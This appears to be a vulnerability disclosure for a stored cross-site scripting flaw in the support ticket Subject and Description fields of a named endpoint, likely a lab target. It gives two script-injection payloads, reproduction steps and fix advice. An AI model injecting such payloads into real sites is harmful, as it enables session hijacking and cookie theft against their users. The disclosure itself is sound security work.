# Stored Cross-Site Scripting (XSS) via Support Ticket Fields

## Summary

A Stored Cross-Site Scripting (XSS) vulnerability exists in the support ticket functionality of the application. User-controlled input submitted through the `Subject` and `Description` fields is stored and rendered without proper sanitization, allowing persistent JavaScript execution in users’ browsers.

---

## Vulnerable Endpoint

```text id="s2k8ra"
http://kzlabs.com/21.php
```

---

## Vulnerable Input Fields

```text id="f9w3qm"
Subject
Description
```

---

## Payloads Used

### Subject

```html id="h6d2pl"
"xicorr><sCript>alert("xicorXSS1")</sCript>
```

### Description

```html id="m1x7vc"
"xicorr><sCript>alert("xicorXSS2")</sCript>
```

---

## Steps to Reproduce

1. Open the following page in a browser:

   ```text
   http://kzlabs.com/21.php
   ```

2. Enter the payloads into the `Subject` and `Description` fields.

3. Submit the support ticket.

4. Observe that the payloads are stored and executed when the support ticket is viewed.

---

## Proof of Concept

```text id="q4n8tz"
http://kzlabs.com/21.php
```

### Screenshots

<img width="1920" height="1078" alt="image" src="https://github.com/user-attachments/assets/3f0c5e56-f19b-4fa5-8fe8-b2e4388cfd4e" />
<img width="1920" height="1078" alt="image" src="https://github.com/user-attachments/assets/5f818609-61f8-41a5-9169-cd968e2f0e7d" />


---

## Impact

* Session hijacking
* Cookie theft
* Persistent JS execution

---

## Recommendations for Fix

* Encode output
* Validate input
* Sanitize stored content
* Secure rendering
